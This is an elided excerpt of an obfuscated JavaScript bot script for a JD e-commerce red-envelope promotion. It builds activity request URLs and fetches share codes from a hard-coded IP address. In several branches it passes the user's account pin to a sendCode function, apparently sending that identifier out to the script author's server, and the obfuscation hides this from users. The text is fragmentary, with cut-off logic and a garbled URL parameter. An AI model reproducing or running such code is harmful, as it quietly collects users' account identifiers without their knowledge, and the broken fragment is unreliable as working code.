 ...
 */
 ...
 !(async () => {
     var _0x2d5026 = {
         ...
         'sPkRb': 'http://106.13.238.181/jd/code/read/jxlhb/10',
                 ...
                 try {
                     if (_0x3fe02b['GFPVw'] !== _0x3fe02b['hMIUc']) {
                         ...
                         if (_0x268bb4['gJMTS'](_0x5c3768['iRet'], 0x0)) {
                             ...
                             if (flag) sendCode(_0x5c3768['Data']['strUserPin']);
                 ...
                 if (_0x5a79cd) {
                     ...
                     if (_0x18093b['mPAld'] !== _0x18093b['mPAld']) {
                         ...
                         if (_0x59e5c5['iRet'] === 0x0) {
                             ...
                             if (flag) sendCode(_0x59e5c5['Data']['strUserPin']);
     ...
     return new Promise(_0x697ecf => {
         ...
         $['get'](_0x3e25e7, (_0x4a7e59, _0x3c8c7c, _0x51b342) => {
             if (_0x42cead['evVXF'](_0x42cead['OHaAC'], _0x42cead['OHaAC'])) {
                 ...
                 if (flag) sendCode(_0x51b342['Data']['strUserPin']);
             ...
             try {
                 if (_0x5b0b55) {
                     ...
                     if (_0x5c93af['NKdPv'](_0x5c93af['YjKrY'], _0x5c93af['uzAkG'])) {
                         let _0x355ea0 = BASE_URL + '/' + functionId + '?activeId=489177&publishFlag=1&channel=7&' + _0x1fa838 + '&sceneval=2&g_login_type=1×tamp=' + Date['now']() + '&_=' + _0x3c03a3['Oulyy'](Date['now'](), 0x2) + '&_ste=1';
 ...
 function getAuthorShareCode(_0x597a72 = 'http://106.13.238.181/jd/code/read/jxlhb/10') {
     var _0x43d5e2 = {
             ...
             if (_0x43d5e2['QEUsw'](_0x43d5e2['QhAYU'], 'cPtUJ')) {
                 ...
                 try {
                     if (_0x43d5e2['xRDdR'](_0x43d5e2['eGprB'], _0x43d5e2['vvTVf'])) {
                         if (_0x380fb9) {} else {
                             if (_0x127c24) _0x127c24 = JSON['parse'](_0x127c24).data;
                         }
                     } else {
 ...
 function taskurl(_0x3cc5c2, _0xbcacf2 = '', _0x5470c2) {
     ...
     let _0x19ec2c = BASE_URL + '/' + _0x3cc5c2 + '?activeId=489177&publishFlag=1&channel=7&' + _0xbcacf2 + '&sceneval=2&g_login_type=1×tamp=' + Date['now']() + '&_=' + (Date['now']() + 0x2) + '&_ste=1';
